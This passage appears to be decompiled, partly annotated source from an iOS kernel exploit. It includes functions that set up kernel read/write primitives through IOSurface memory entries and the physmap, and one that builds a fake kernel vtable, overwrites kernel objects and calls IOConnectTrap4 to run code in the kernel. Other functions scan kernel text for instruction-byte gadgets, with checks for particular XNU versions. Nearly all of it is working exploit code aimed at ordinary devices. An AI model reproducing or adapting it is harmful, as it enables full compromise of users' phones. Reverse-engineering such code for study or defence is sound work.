          v11 = (unsigned int *)iosurface_enum_mach_port(krwCtx, v9);
          if ( !v11 )
            return false;
          v12 = v19[v9];
          portKaddr = task_self_get_ipc_port(krwCtx, v12);
          if ( !portKaddr )
            return false;
          if ( (unsigned int)kread_and_vm_attr_double(krwCtx, portKaddr) || mach_port_mod_refs(mach_task_self_, v12, 0, 0xFFFF) )
            return false;
          *v11 = v12;
        }
        ++v9;
        ++v10;
        result = true;
      }
      while ( v9 != 3 );
    }
  }
  return result;
}

//----- (000000000001D4A0) ----------------------------------------------------
bool __fastcall krw_setup_iosurface(struct_krwCtx *krwCtx)
{
  // struct_krwCtx *krwCtx; // x19
  vm_size_t v1; // x20
  mach_port_name_t *portSlot; // x0
  int v4; // w8
  kern_return_t memory_entry; // w8
  kern_return_t v6; // w8
  uint64_t *v7; // x1
  kern_return_t status; // w0
  __int64 v9; // x21
  char v10; // w8
  char v11; // w24
  unsigned int *v12; // x20
  unsigned int v13; // w21
  __int64 portKaddr; // x0
  mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-54h] BYREF
  vm_address_t address; // [xsp+10h] [xbp-50h] BYREF
  vm_size_t size; // [xsp+18h] [xbp-48h] BYREF
  uint32_t v17[2]; // [xsp+20h] [xbp-40h]

  v1 = vm_page_size;
  address = 0;
  size = vm_page_size;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
    return false;
  portSlot = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, 0);
  if ( !portSlot )
    return false;
  if ( *portSlot + 1 > 1 )
    return true;
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) < 2
    || !krwCtx->threadStateKrwPhysAddr
    || (unsigned int)(krwCtx->ioSurfaceMemEntryMaybe + 1) < 2 )
  {
    return false;
  }
  v17[0] = krwCtx->ioSurfaceMemEntryMaybe;
  v4 = setup_physmap_krw(krwCtx, 0);
  if ( v4 )
    return false;
  if ( !krwCtx->gap_0x19D0_size8
    || !krwCtx->physmapBasePhys
    || !krwCtx->physmapSize
    || !krwCtx->percpuBasePhys
    || !krwCtx->percpuSize )
  {
    return false;
  }
  memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 131075, &object_handle, 0);
  if ( !memory_entry )
  {
    v17[1] = object_handle;
    v6 = vm_map(mach_task_self_, &address, v1, 0, 1, object_handle, 0, 0, 3, 3, 2u);
    if ( !v6 )
    {
      bzero((void *)address, v1);
      v7 = (uint64_t *)address;
      *(uint64_t *)address = krwCtx->gap_0x19D0_size8;
      v7[4] = krwCtx->iogpuKobjPtr2;
      v7[5] = krwCtx->iogpuObjCount;
      v7[6] = krwCtx->physmapBasePhys;
      v7[7] = krwCtx->physmapSize;
      v7[8] = krwCtx->percpuBasePhys;
      v7[9] = krwCtx->percpuSize;
      status = vm_deallocate(mach_task_self_, (vm_address_t)v7, v1);
      v9 = 0;
      v10 = 1;
      while ( 1 )
      {
        v11 = v10;
        portSlot = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, v9);
        if ( !portSlot )
          break;
        v12 = portSlot;
        v13 = v17[v9];
        portKaddr = task_self_get_ipc_port(krwCtx, v13);
        if ( !portKaddr )
          break;
        if ( (unsigned int)kread_and_vm_attr_double(krwCtx, portKaddr) )
          return false;
        status = mach_port_mod_refs(mach_task_self_, v13, 0, 0xFFFF);
        if ( status )
          return false;
        v10 = 0;
        *v12 = v13;
        v9 = 1;
        if ( (v11 & 1) == 0 )
          return iosurface_check_and_alloc_port(krwCtx) == 0;
      }
    }
  }
  return false;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000001D70C) ----------------------------------------------------
bool __fastcall krw_setup_iosurface_v2(struct_krwCtx *krwCtx, uint32_t *a2)
{
  // struct_krwCtx *krwCtx; // x19
  vm_size_t v2; // x20
  __int64 v5; // x0
  __int64 v7; // x23
  char v8; // w8
  int v9; // w21
  char v10; // w26
  mach_port_name_t *v11; // x0
  mach_port_name_t v12; // w1
  __int64 v13; // x8
  char v14; // w9
  char v15; // w23
  mach_port_name_t v16; // w1
  bool v17; // zf
  __int64 v18; // x23
  __int64 v19; // x23
  vm_address_t v20; // x8
  __int64 v21; // x9
  __int64 v22; // x9
  int v23; // w10
  __int64 v24; // x11
  int v25; // w8
  int v26; // [xsp+Ch] [xbp-54h] BYREF
  vm_address_t address; // [xsp+10h] [xbp-50h] BYREF
  mem_entry_name_port_t object[2]; // [xsp+18h] [xbp-48h]

  address = 0;
  *(uint64_t *)object = 0;
  v2 = vm_page_size;
  v26 = -1;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
    return false;
  v5 = fd_open_dev_null(&v26);
  if ( (uint32_t)v5 )
    return false;
  v7 = 0;
  v8 = 1;
  v9 = 163878;
  while ( 1 )
  {
    v10 = v8;
    v11 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, v7);
    if ( !v11 )
      break;
    v12 = *v11;
    object[v7] = *v11;
    if ( v12 + 1 < 2 )
      break;
    v5 = mach_port_mod_refs(mach_task_self_, v12, 0, 1);
    if ( (uint32_t)v5 )
      break;
    v8 = 0;
    v7 = 1;
    if ( (v10 & 1) == 0 )
    {
      if ( !vm_map(mach_task_self_, &address, v2, 0, 1, object[1], 0, 0, 3, 3, 2u) )
      {
        v18 = *(uint64_t *)address;
        if ( validate_kaddr_range(krwCtx, *(uint64_t *)address) )
        {
          krwCtx->gap_0x19D0_size8 = v18;
          v19 = *(uint64_t *)(address + 32);
          if ( validate_kaddr_range(krwCtx, v19) )
          {
            krwCtx->iogpuKobjPtr2 = v19;
            v20 = address;
            v21 = *(uint64_t *)(address + 40);
            if ( (unsigned __int64)(v21 - 1) <= 0x1F )
            {
              krwCtx->iogpuObjCount = v21;
              krwCtx->ioSurfaceMemEntryMaybe = object[0];
              v22 = *(uint64_t *)(v20 + 48);
              if ( v22 )
              {
                if ( (v22 & 7) == 0 )
                {
                  v23 = *(uint32_t *)(v20 + 56);
                  if ( v23 )
                  {
                    v24 = *(uint64_t *)(v20 + 64);
                    if ( v24 )
                    {
                      if ( (v24 & 7) == 0 )
                      {
                        v25 = *(uint32_t *)(v20 + 72);
                        if ( v25 )
                        {
                          krwCtx->physmapBasePhys = v22;
                          krwCtx->physmapSize = v23;
                          krwCtx->percpuBasePhys = v24;
                          krwCtx->percpuSize = v25;
                          v9 = krw_read_validation(krwCtx, 1);
                          if ( !v9 )
                          {
                            fd_close(v26);
                            v26 = -1;
                            v9 = krw_write_validation(krwCtx);
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      break;
    }
  }
  if ( v26 != -1 )
    fd_close(v26);
  if ( v9 )
  {
    v13 = 0;
    v14 = 1;
    do
    {
      v15 = v14;
      v16 = object[v13];
      if ( v16 + 1 >= 2 )
        mach_port_deallocate(mach_task_self_, v16);
      v14 = 0;
      v13 = 1;
    }
    while ( (v15 & 1) != 0 );
  }
  if ( address )
    v17 = v2 == 0;
  else
    v17 = 1;
  if ( !v17 )
    vm_deallocate(mach_task_self_, address, v2);
  *a2 = v9 == 0;
  return true;
}

//----- (000000000001D970) ----------------------------------------------------
mach_vm_address_t __fastcall build_kernel_vtable(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, uint64_t *a7)
{
  // struct_krwCtx *krwCtx; // x19
  uint64_t *v2; // x21
  uintptr_t v4; // x22
  uintptr_t v6; // x23
  uintptr_t v8; // x24
  __int64 v10; // x25
  __int64 v12; // x26
  __int64 v13; // x19
  unsigned int v14; // w8
  unsigned int v15; // w10
  unsigned int v16; // w8
  __int64 v17; // x0
  const CFDictionaryRef *v18; // x0
  io_service_t MatchingService; // w0
  io_object_t v20; // w20
  unsigned int v21; // w27
  mach_vm_address_t v22; // x28
  unsigned __int64 v23; // x0
  __int64 v24; // x8
  unsigned int v25; // w22
  __int64 address; // [xsp+18h] [xbp-1098h]
  unsigned int size[3]; // [xsp+24h] [xbp-108Ch] BYREF
  __int128 v29; // [xsp+30h] [xbp-1080h]
  __int64 v30; // [xsp+40h] [xbp-1070h]
  io_connect_t connect; // [xsp+4Ch] [xbp-1064h] BYREF
  __int128 v32; // [xsp+50h] [xbp-1060h] BYREF
  __int64 v33; // [xsp+60h] [xbp-1050h]

  v2 = a7;
  v4 = a6;
  v6 = a5;
  v8 = a4;
  v10 = a3;
  v12 = a2;
  v13 = krwCtx;
  krwCtx = KRWCTX_FROM_UINTPTR(v13);
  connect = 0;
  *(uint64_t *)&size[1] = 0;
  v14 = krwCtx->pageSizeOrSomething;
  v15 = 0x1000 % v14;
  v16 = v14 - 0x1000 % v14 + 4096;
  if ( !v15 )
    v16 = 4096;
  size[0] = v16;
  if ( !krwCtx->gap_0x200 )
  {
    macho_find_text_section(krwCtx->kernelMachoCtx, &v32);
    v29 = v32;
    v30 = v33;
    v17 = kernel_pattern_scan((__int64)&v32, "00 00 01 91 C0 03 5F D6", 0);
    if ( !v17 )
      return 0;
    *(uint64_t *)(v13 + 512) = v17;
  }
  v18 = IOServiceMatching("AppleM2ScalerCSCDriver");
  MatchingService = IOServiceGetMatchingService(kIOMasterPortDefault, v18);
  v20 = MatchingService;
  v21 = MatchingService + 1;
  if ( MatchingService + 1 < 2 )
    goto LABEL_21;
  v22 = 0;
  if ( IOServiceOpen(MatchingService, mach_task_self_, 0, &connect) )
    goto LABEL_22;
  if ( connect + 1 < 2 )
  {
LABEL_21:
    v22 = 0;
    goto LABEL_22;
  }
  v22 = get_task_kobject_addr(krwCtx, connect);
  if ( v22 )
  {
    if ( kread_physmap_decorated(krwCtx, v22, (unsigned __int64 *)&size[1]) )
    {
      if ( validate_kaddr_range(v13, *(__int64 *)&size[1]) )
      {
        v23 = alloc_physmap_page(v13, size);
        if ( v23 )
        {
          address = v23;
          if ( !(unsigned int)krw_read_thunk(krwCtx, *(__int64 *)&size[1], 4096, &v32)
            || !(unsigned int)kwrite_with_retry(v13, address, (__int64)&v32, 4096) )
          {
            goto LABEL_28;
          }
          v24 = 1464;
          if ( *(int *)(v13 + 320) > 6152 )
            v24 = 1472;
          if ( kwrite64(v13, v24 + address, *(uint64_t *)(v13 + 512)) )
          {
            kwrite64(v13, v22, address);
            kwrite64(v13, v22 + 64, 8);
            kwrite64(v13, v22 + 72, v12);
            kwrite64(v13, v22 + 80, 2 * v10 - 16);
            v25 = IOConnectTrap4(connect, 0, v8, v6, v4, 0);
            kwrite64(v13, v22 + 64, 0);
            kwrite64(v13, v22 + 72, 0);
            kwrite64(v13, v22 + 80, 0);
            kwrite64(v13, v22, *(__int64 *)&size[1]);
            if ( v2 )
              *v2 = v25;
            v22 = 1;
          }
          else
          {
LABEL_28:
            v22 = 0;
          }
          map_shared_mem_and_transfer_data(v13, address, size[0]);
          goto LABEL_22;
        }
      }
    }
    goto LABEL_21;
  }
LABEL_22:
  if ( connect + 1 >= 2 )
    IOServiceClose(connect);
  if ( v21 >= 2 )
    IOObjectRelease(v20);
  return v22;
}
// 1D9A8: variable 'v1' is possibly undefined
// 1D9AC: variable 'v3' is possibly undefined
// 1D9B0: variable 'v5' is possibly undefined
// 1D9B4: variable 'v7' is possibly undefined
// 1D9B8: variable 'v9' is possibly undefined
// 1D9BC: variable 'v11' is possibly undefined
// 48940: using guessed type __int64 __chkstk_darwin(void);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (000000000001DCA8) ----------------------------------------------------
__int64 kernel_pattern_scan(SearchObj *obj, const char *pattern_str, uint32_t align_flag)
{
    uint32_t flags = 0; // unsued

    // Zero the strtol endptr slot
    // str xzr, [sp, #0x28]
    char *strtol_end = NULL;

    if (pattern_str == NULL)
        return NULL;

    // strdup the pattern so strsep can mutate it
    char *buf = strdup(pattern_str);
    if (buf == NULL)
        return NULL;

    char    *buf_saved = buf;          // x24, kept for free() later
    char    *str_ptr   = buf;          // [sp+0x10], consumed by strsep
    int16_t  pat[128];                 // [sp+0x30], x20 = sp+0x30
    intptr_t pat_len   = 0;            // x22, count of tokens written
    intptr_t anchor    = 0;            // x23, index of '-' separator

    // String literals for token comparison
    // x25 = " "   (space separator for strsep)
    // x26 = "-"
    // x27 = "+"
    // x28 = ".."

    char *token;
    while ((token = strsep(&str_ptr, " ")) != NULL) {

        if (strcmp(token, "-") == 0) {
            // '-' marks the anchor point: anchor = current pat_len
            anchor = pat_len;
            // b → +276 (increment pat_len)

        } else if (strcmp(token, "+") == 0) {
            // '+' marks anchor+1
            anchor = pat_len + 1;
            // b → +276

        } else if (strcmp(token, "..") == 0) {
            // ".." = wildcard: store 0xFFFF (-1 as int16_t)
            pat[pat_len] = (int16_t)0xFFFF;
            // fall into +264: check pat_len <= 0x7e, then increment

        } else {
            // Hex byte token: parse with strtol base 16
            // strtol(token, &strtol_end, 16)
            long val = strtol(token, &strtol_end, 16);
            pat[pat_len] = (int16_t)(val & 0xFF);  // and w8,w0,#0xff; strh

            // Check if strtol consumed the whole token
            // ldr x8, [sp,#0x28]; ldrb w8, [x8]
            // cbz w8 → +264 (good, advance)
            // else → +336 (error, free and return NULL)
            if (*strtol_end != '\0') {
                // Parse error — strtol stopped early
                free(buf_saved);
                return NULL;
            }
        }

        // +264: guard against overflow (max 0x7f tokens)
        if (pat_len > 0x7e) {
            free(buf_saved);
            return NULL;
        }

        pat_len++;  // add x22, x22, #1

        // +276: loop back if str_ptr still has content
        // cbnz x8 (=[sp+0x10]) → strsep loop
    }

    // Done parsing — free the strdup'd buffer
    free(buf_saved);

    // Copy obj into local snapshot (24 bytes: q0 + x8)
    // ldr q0,[x21]; str q0,[sp+0x10]
    // ldr x8,[x21+0x10]; str x8,[sp+0x20]
    SearchObj local_obj;
    memcpy(&local_obj, obj, 0x18);

    // Call scan_kernel_text_gadget with parsed pattern
    // x0 = &local_obj
    // x1 = pat          (int16_t array at sp+0x30)
    // x2 = pat_len      (x22)
    // x3 = anchor       (x23)
    // w4 = align_flag   (w20, from ldp w4,w5,[sp+0x8])
    // w5 = flags        (w19, from ldp w4,w5,[sp+0x8])
    return scan_kernel_text_gadget(&local_obj, pat, pat_len, anchor, align_flag, flags);
}

//----- (000000000001DE40) ----------------------------------------------------
__int64 __fastcall scan_kernel_text_gadget(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, int a5, __int64 a6)
{
  int len; // w22
  int last; // w22
  int i; // w10
  unsigned __int64 page_mask; // x28
  unsigned int align_mask; // w8
  unsigned __int64 mapped; // x8
  unsigned __int64 mapped_size; // x1
  unsigned __int64 mapped_end; // x26
  unsigned __int64 cursor; // x22
  unsigned __int64 last_prefetched; // x9
  unsigned __int64 vm_addr; // x8
  __int16 *pattern; // x23
  __int16 pat_byte; // w10
  __int64 scan_range[3]; // [xsp+10h] [xbp-180h] BYREF
  sub_197A8_result v31; // x0,x1

#if defined(__arm64e__)
  __asm__ volatile("xpaci %0" : "+r"(a2));
#endif
  __asm__ volatile("" : : "r"(a6));
  len = (int)a3;
  pattern = (__int16 *)a2;
  if ( a3 != (char)a3 || len <= 0 || !a1[2] || !a1[1] )
    return 0;

  last = len - 1;
  while ( last >= 0 && pattern[last] == -1 )
    --last;
  if ( last < 0 )
  {
    vm_addr = a1[1];
    if ( !a5 || (vm_addr & (unsigned int)(a5 - 1)) == 0 )
      return vm_addr ? vm_addr + a4 : 0;
    return 0;
  }

  scan_range[0] = a1[0];
  scan_range[1] = a1[1];
  scan_range[2] = a1[2];
  v31 = macho_find_segment((__int64 **)scan_range, 1);
  mapped = v31.addr;
  mapped_size = v31.size;
  if ( !mapped || !mapped_size )
    return 0;

  mapped_end = mapped + mapped_size;
  if ( mapped_size < (unsigned int)len )
    return 0;

  page_mask = (unsigned __int64)-(int)*(uint32_t *)(*a1 + 56);
  align_mask = a5 ? (unsigned int)(a5 - 1) : 0;
  last_prefetched = 0;
  cursor = mapped;
  while ( cursor <= mapped_end - (unsigned int)len )
  {
    unsigned __int64 touch;

    touch = cursor + (unsigned int)last;
    if ( ((last_prefetched ^ touch) & page_mask) != 0 )
    {
      macho_walk_segment_by_name_0(*a1, touch, 1u, mapped_end - touch);
      last_prefetched = touch;
    }

    vm_addr = a1[1] + cursor - mapped;
    if ( !align_mask || (vm_addr & align_mask) == 0 )
    {
      for ( i = 0; i < len; ++i )
      {
        pat_byte = pattern[i];
        if ( pat_byte != -1 && *(unsigned __int8 *)(cursor + i) != (unsigned __int8)pat_byte )
          break;
      }
      if ( i == len )
        return vm_addr ? vm_addr + a4 : 0;
    }
    ++cursor;
  }
  return 0;
}

//----- (000000000001E0C8) ----------------------------------------------------
__int64 __fastcall search_binary_pattern_text(__int128 *a1, char *__s, int a3, char a4)
{
  size_t v8; // x24
  uint16_t *v9; // x0
  void *v10; // x21
  __int64 v11; // x10
  unsigned int v12; // w11
  __int16 v13; // w12
  __int64 v15; // x2
  __int64 v16; // x19
  __int64 scan_range[3]; // [xsp+0h] [xbp-60h] BYREF

  v8 = strlen(__s);
  v9 = malloc(2 * (v8 + 2));
  if ( !v9 )
    return 0;
  v10 = v9;
  v9[v8 + 1] = 0;
  *v9 = 0;
  if ( v8 )
  {
    v11 = 0;
    v12 = 1;
    do
    {
      v13 = (unsigned __int8)__s[v11];
      v11 = v12;
      v9[v12] = v13;
    }
    while ( v8 > v12++ );
  }
  if ( (a4 & 0x20) != 0 )
    v15 = v8 + 2;
  else
    v15 = v8 + 1;
  scan_range[0] = *(uint64_t *)a1;
  scan_range[1] = *((uint64_t *)a1 + 1);
  scan_range[2] = *((uint64_t *)a1 + 2);
  v16 = scan_kernel_text_gadget(scan_range, (__int64)&v9[((unsigned __int8)(a4 & 0x20) >> 5) ^ 1], v15, (a4 & 0x20) != 0, a3, a4);
  free(v10);
  return v16;
}

//----- (000000000001E1B8) ----------------------------------------------------
unsigned __int64 __fastcall find_pattern_kernel_section(__int64 *a1, __int64 a2, int a3)
{
  unsigned __int64 v5; // x1
  unsigned __int64 v6; // x21
  unsigned __int64 result; // x0
  unsigned __int64 v8; // x22
  unsigned __int64 v9; // x25
  unsigned __int64 v10; // x23
  unsigned __int64 v11; // x27
  char *v12; // x24
  __int64 scan_range[3]; // [xsp+0h] [xbp-70h] BYREF
  __int64 __s2; // [xsp+18h] [xbp-58h] BYREF
  sub_197A8_result v13; // x0,x1

  scan_range[0] = a1[0];
  scan_range[1] = a1[1];
  scan_range[2] = a1[2];
  __s2 = a2;
  v13 = macho_find_segment((__int64 **)scan_range, 1);
  v6 = v13.addr;
  v5 = v13.size;
  result = 0;
  if ( v6 )
  {
    v8 = v5;
    if ( v5 )
    {
      v9 = v6 + v5;
      v10 = *(unsigned __int8 *)(*a1 + 52);
      if ( v6 + v10 > v6 + v5 )
      {
        return 0;
      }
      else
      {
        v11 = v6;
        v12 = (char *)v6;
        while ( 1 )
        {
          if ( !a3 || (v11 & (a3 - 1)) == 0 )
          {
            macho_walk_segment_by_name_0(*a1, (unsigned __int64)v12, v10, v8);
            if ( !memcmp(v12, &__s2, v10) )
              break;
          }
          ++v12;
          ++v11;
          --v8;
          if ( (unsigned __int64)&v12[v10] > v9 )
            return 0;
        }
        return a1[1] - v6 + v11;
      }
    }
  }
  return result;
}
// 1E20C: variable 'v5' is possibly undefined

//----- (000000000001E2BC) ----------------------------------------------------
char *__fastcall find_pattern_macho_binary(__int64 *a1, uint32_t *a2, uint32_t *a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // x1
  unsigned __int64 v9; // x23
  char *result; // x0
  unsigned __int64 v11; // x24
  uint32_t *v12; // x10
  __int64 v13; // x12
  __int64 scan_range[3]; // [xsp+0h] [xbp-50h] BYREF
  sub_197A8_result v14; // x0,x1

  scan_range[0] = a1[0];
  scan_range[1] = a1[1];
  scan_range[2] = a1[2];
  v14 = macho_find_segment((__int64 **)scan_range, 1);
  v9 = v14.addr;
  v8 = v14.size;
  result = 0;
  if ( v9 && v8 )
  {
    v11 = v9 + v8;
    macho_walk_segment_by_name_0(*a1, v9, v8, v8);
    if ( v9 < v11 )
    {
      v12 = (uint32_t *)v9;
      do
      {
        if ( (*a3 & *v12) == *a2 )
        {
          if ( (unsigned __int64)&v12[a4] >= v11 )
            return 0;
          if ( a4 < 2 )
          {
LABEL_11:
            result = (char *)v12 + a1[1] - v9;
            if ( result )
              return result;
          }
          else
          {
            v13 = 1;
            while ( (a3[v13] & v12[v13]) == a2[v13] )
            {
              if ( a4 == ++v13 )
                goto LABEL_11;
            }
          }
        }
        ++v12;
      }
      while ( (unsigned __int64)v12 < v11 );
    }
    return 0;
  }
  return result;
}
// 1E314: variable 'v8' is possibly undefined

//----- (000000000001E3C4) ----------------------------------------------------
unsigned __int64 __fastcall kernel_find_symbol_by_cstring_scan(__int64 a1, char *a2, const char *a3, char *a4)
{
  unsigned __int64 result; // x0
  __int64 v9; // x22
  __int64 v10[3]; // [xsp+0h] [xbp-50h] BYREF
  __int128 v11; // [xsp+18h] [xbp-38h] BYREF

  macho_getsectbyname("__TEXT", a1, "__cstring", &v11);
  result = search_binary_pattern_text(&v11, a4, 0, 33);
  if ( result )
  {
    v9 = result;
    macho_getsectbyname(a2, a1, a3, v10);
    return find_pattern_kernel_section(v10, v9, *(unsigned __int8 *)(a1 + 52));
  }
  return result;
}

//----- (000000000001E45C) ----------------------------------------------------
char *__fastcall find_kernel_gadget(__int64 a1)
{
  char *result; // x0
  unsigned __int64 v3; // x8
  unsigned int v4; // w20
  const char *v5; // x9
  const char *v6; // x10
  char *v7; // x1
  __int64 v8; // x8
  uint64_t v9[3]; // [xsp+8h] [xbp-58h] BYREF
  uint64_t v10[3]; // [xsp+20h] [xbp-40h] BYREF
  uint64_t v11[3]; // [xsp+38h] [xbp-28h] BYREF

  if ( krw_ctx_has_flag(KRWCTX_FROM_RAW_FIELD(a1, 280), KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) )
  {
    macho_find_text_section(a1, v11);
    result = (char *)kernel_pattern_scan((__int64)v11, "08 FD 64 D3 1F 21 00 F1 .. 00 00 54", 0);
    if ( !result )
      return result;
    v3 = (unsigned __int64)(result + 12);
    return find_kernel_func_by_branch((__int64 *)a1, (__int64 *)(v3 & 0xFFFFFFFFFFFFFFFCLL), 1);
  }
  if ( *(uint64_t *)(a1 + 136) >= XNU_VERSION_PACKED(8792, 80, 25, 0, 0) && !krw_ctx_has_flag(KRWCTX_FROM_RAW_FIELD(a1, 280), KRW_CTX_FLAG_CPU_A9) )
  {
    macho_find_text_section(a1, v10);
    result = (char *)kernel_pattern_scan((__int64)v10, ".. FD .. D3 .. 00 00 B5", 0);
    if ( !result )
      return result;
    v3 = (unsigned __int64)(result + 8);
    return find_kernel_func_by_branch((__int64 *)a1, (__int64 *)(v3 & 0xFFFFFFFFFFFFFFFCLL), 1);
  }
  v4 = get_sptm_version_index(a1);
  macho_find_text_section(a1, v9);
  v5 = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
  v6 = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
  if ( v4 != 1 )
    v6 = 0;
  if ( v4 <= 1 )
    v5 = v6;
  if ( v4 <= 4 )
    v7 = (char *)v5;
  else
    v7 = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
  result = (char *)kernel_pattern_scan((__int64)v9, v7, 0);
  v8 = 12;
  if ( v4 <= 1 )
    v8 = -8;
  if ( result )
  {
    v3 = (unsigned __int64)&result[v8];
    return find_kernel_func_by_branch((__int64 *)a1, (__int64 *)(v3 & 0xFFFFFFFFFFFFFFFCLL), 1);
  }
  return result;
}

//----- (000000000001E598) ----------------------------------------------------
__int64 __fastcall get_sptm_version_index(__int64 a1)
{
  int v1; // w8

  v1 = *(uint32_t *)(a1 + 112);
  if ( v1 > 8791 )
  {
    if ( v1 == 8792 || v1 == 8796 )
      return 5LL;
    if ( v1 == 10002 )
      return 6LL;
  }
  else
  {
    if ( (unsigned int)(v1 - 8019) < 2 )
      return 4LL;
    if ( v1 == 6153 )
      return 2LL;
    if ( v1 == 7195 )
      return 3LL;
  }
  return 0LL;
}

//----- (000000000001E620) ----------------------------------------------------
unsigned __int64 __fastcall find_kernel_func_aligned(__int64 *a1, __int64 a2)
{
  return (unsigned __int64)find_kernel_func_by_branch(a1, (__int64 *)(a2 & 0xFFFFFFFFFFFFFFFCLL), 1);
}

//----- (000000000001E62C) ----------------------------------------------------
__int64 __fastcall find_kernel_func_by_scan(__int64 *a1)
{
  unsigned int v2; // w20
  bool v3; // zf
  unsigned __int64 v4; // x0
  unsigned __int64 v5; // x8
  const char *v6; // x8
  char *v7; // x1
  __int64 result; // x0
  __int128 v9; // [xsp+0h] [xbp-60h] BYREF
  __int64 v10; // [xsp+10h] [xbp-50h]
  __int64 v11; // [xsp+20h] [xbp-40h] BYREF
  __int64 v12; // [xsp+28h] [xbp-38h]
  __int64 v13; // [xsp+30h] [xbp-30h]
  __int128 v14; // [xsp+38h] [xbp-28h] BYREF
  __int64 v15; // [xsp+48h] [xbp-18h]

  v2 = get_sptm_version_index((__int64)a1);
  macho_find_text_section((__int64)a1, &v14);
  macho_getsectbyname("__DATA_CONST", (__int64)a1, "__mod_init_func", &v11);
  if ( v12 )
    v3 = v13 == 0;
  else
    v3 = 1;
  if ( !v3 )
  {
    v4 = macho_read_u64_thunk(a1, v12);
    if ( v4 )
    {
      v5 = *((uint64_t *)&v14 + 1) - v4;
      if ( *((uint64_t *)&v14 + 1) < v4 && v4 < v15 + *((uint64_t *)&v14 + 1) )
      {
        *((uint64_t *)&v14 + 1) = v4;
        v15 += v5;
      }
    }
  }
  v6 = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if ( v2 != 1 )
    v6 = 0;
  if ( v2 <= 1 )
    v7 = (char *)v6;
  else
    v7 = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  v9 = v14;
  v10 = v15;
  result = kernel_pattern_scan((__int64)&v9, v7, 0);
  if ( result )
  {
    result = (__int64)find_kernel_func_by_branch(a1, (__int64 *)((result + 12) & 0xFFFFFFFFFFFFFFFCLL), 1);
    if ( result )
      return macho_read_u64_thunk(a1, result);
  }
  return result;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (000000000001E728) ----------------------------------------------------
char *__fastcall find_kernel_branch_target(__int64 *a1)
{
  char *result; // x0
  char *v3; // x20
  unsigned __int64 v4; // x21
  uint64_t v5[3]; // [xsp+8h] [xbp-48h] BYREF

  macho_find_text_section((__int64)a1, v5);
  result = (char *)kernel_pattern_scan((__int64)v5, "E0 03 15 AA .. .. .. .. FE 03 13 AA", 0);
  if ( result )
  {
    result = resolve_branch_target(a1, (__int64 *)(result + 4));
    if ( result )
    {
      v3 = result;
      v4 = -4;
      while ( ((unsigned int)macho_read_u32(a1, (__int64 *)&v3[v4 + 4]) & 0x9F000000) != 0x90000000
           || (unsigned int)macho_read_u32(a1, (__int64 *)&v3[v4 + 12]) >> 21 != 1112 )
      {
        v4 += 4LL;
        if ( v4 >= 0xFC )
          return 0;
      }
      return find_kernel_func_by_branch(a1, (__int64 *)&v3[v4 + 4], 1);
    }
  }
  return result;
}

//----- (000000000001E800) ----------------------------------------------------
char *__fastcall resolve_branch_target(__int64 *a1, __int64 *a2)
{
  unsigned int insn; // w0
  __int64 imm26; // x8

  insn = (unsigned int)macho_read_u32(a1, a2);
  if ( (insn & 0x7C000000) != 0x14000000 )
    return 0;
  imm26 = insn & 0x1FFFFFF;
  if ( (insn & 0x2000000) != 0 )
    imm26 |= 0xFFFFFFFFFE000000LL;
  if ( !imm26 )
    return 0;
  return (char *)a2 + 4 * imm26;
}

//----- (000000000001E854) ----------------------------------------------------
unsigned __int64 __fastcall find_kernel_func(__int64 *a1, __int64 *a2)
{
  return (unsigned __int64)find_kernel_func_by_branch(a1, a2, 1);
}

//----- (000000000001E85C) ----------------------------------------------------
unsigned __int64 __fastcall find_kernel_func_versioned(__int64 *someStruct, int *a2)
{
  struct_krwCtx *krwCtx;
  __int64 v5; // x0
  unsigned __int64 v6; // x0
  unsigned __int64 v7; // x22
  __int64 v8; // x23
  unsigned __int64 v9; // x21
  int v10; // w8
  unsigned int v12; // [xsp+0h] [xbp-60h] BYREF
  unsigned __int64 scan_range[3]; // [xsp+8h] [xbp-58h] BYREF
  unsigned __int64 text_range[3]; // [xsp+20h] [xbp-40h] BYREF

  krwCtx = KRWCTX_FROM_UINTPTR(someStruct[35]);
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    macho_find_text_section(krwCtx->kernelMachoCtx, text_range);
    scan_range[0] = text_range[0];
    scan_range[1] = text_range[1] + text_range[2] - 0x20000;
    scan_range[2] = 0x20000;
    v5 = kernel_pattern_scan((__int64)scan_range, "2B 09 40 B9 4B 39 0B 8B", 0);
    if ( v5 )
    {
      v6 = (unsigned __int64)find_kernel_func_by_branch(krwCtx, (__int64 *)(v5 - 40), 1);
      if ( v6 )
      {
        v7 = v6;
        v8 = macho_read_u64_thunk(krwCtx, v6 - 8);
        if ( validate_kaddr_range(krwCtx, v8) )
        {
          if ( kread_u32(krwCtx, v8, &v12) && v12 - 1 <= 0x1F )
          {
            v9 = macho_read_u64_thunk(krwCtx, v7);
            if ( validate_kaddr_range(krwCtx, v9) )
            {
              v10 = v12;
LABEL_12:
              *a2 = v10;
              return v9;
            }
          }
        }
      }
    }
    return 0;
  }
  else
  {
    v9 = (unsigned __int64)find_kernel_branch_target(someStruct);
    if ( v9 )
    {
      v10 = 8;
      goto LABEL_12;
    }
  }
  return v9;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (000000000001E99C) ----------------------------------------------------
